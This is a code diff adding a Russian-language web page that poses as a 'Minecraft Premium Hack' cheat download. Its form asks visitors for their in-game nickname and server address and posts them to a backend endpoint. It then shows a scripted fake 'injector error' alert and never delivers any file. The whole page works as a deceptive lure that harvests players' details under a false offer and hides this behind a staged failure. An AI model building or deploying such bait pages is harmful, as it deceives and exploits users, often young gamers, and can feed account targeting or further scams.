@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Minecraft Cheat Client v1.4</title>
+    <style>
+        body { background-color: #121212; color: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #1e1e1e; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; width: 350px; }
+        h1 { color: #4caf50; font-size: 24px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; border-radius: 5px; background-color: #252525; color: #fff; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background-color: #4caf50; border: none; border-radius: 5px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .status { margin-top: 15px; font-size: 14px; color: #aaa; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Minecraft Premium Hack</h1>
+    <p>Введите данные для привязки лицензии обхода:</p>
+    
+    <form id="cheatForm">
+        <input type="text" id="username" placeholder="Ваш ник в игре" required>
+        <input type="text" id="server" placeholder="Адрес сервера (reallworld.ru)" required>
+        <button type="submit" id="btn">Скачать Чит (.jar)</button>
+    </form>
+
+    <div class="status" id="statusText"></div>
+</div>
+
+<script>
+    document.getElementById('cheatForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const server = document.getElementById('server').value;
+        const btn = document.getElementById('btn');
+        const statusText = document.getElementById('statusText');
+
+        btn.disabled = true;
+        btn.innerText = "Подключение...";
+        statusText.innerText = "Авторизация в системе...";
+
+        // Отправляем данные на нашу безопасную серверную функцию Vercel
+        try {
+            const response = await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, server })
+            });
+
+            if (response.ok) {
+                setTimeout(() => {
+                    statusText.style.color = "#4caf50";
+                    statusText.innerText = "Ошибка инжектора! Запустите Minecraft.";
+                    btn.innerText = "Скачано";
+                    alert("Ошибка! Не удалось активировать функции движения. Проверьте Minecraft!");
+                }, 1000);
+            } else {
+                statusText.innerText = "Ошибка сервера.";
+                btn.disabled = false;
+            }
+        } catch (err) {
+            statusText.innerText = "Ошибка сети.";
+            btn.disabled = false;
+        }
+    });
+</script>
+
+</body>
+</html>
